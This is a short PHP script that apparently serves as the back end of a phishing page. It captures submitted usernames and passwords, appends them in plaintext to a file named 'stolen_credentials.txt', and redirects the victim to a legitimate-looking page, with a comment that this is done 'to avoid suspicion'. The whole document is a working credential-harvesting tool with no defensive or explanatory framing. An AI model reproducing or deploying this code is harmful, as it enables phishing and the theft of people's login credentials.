<?php
// Check if the form was submitted via POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Extract the submitted credentials
    $user = $_POST['username'];
    $pass = $_POST['password'];
    
    // Format the data for logging
    $log_entry = "Username: " . $user . " | Password: " . $pass . "\n";
    
    // Open the text file (creates it if it doesn't exist) and append the data
    // Ensure the web server has write permissions for this directory
    $file = fopen("stolen_credentials.txt", "a");
    fwrite($file, $log_entry);
    fclose($file);
    
    // Redirect the user to the legitimate website to avoid suspicion
    header("Location: index.html");
    exit();
}
?>